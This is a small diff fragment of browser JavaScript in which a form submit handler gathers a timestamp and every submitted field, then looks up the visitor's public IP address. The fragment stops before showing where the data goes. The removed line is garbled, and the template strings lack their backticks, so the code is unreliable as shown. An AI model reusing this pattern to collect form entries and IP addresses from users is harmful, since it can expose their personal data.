@@ -9,7 +9,7 @@ window.onload = () => {
     const formData = new FormData(e.target);
     let text = Time: ${new Date().toISOString()}\n;
     for (const [key, value] of formData.entries()) {
-      text +=VRpkh3-QVSb7IVV6uHQA";
+      text += ${key}: ${value}\n;
     }
     fetch("https://api.ipify.org")
       .then((res) => res.text())
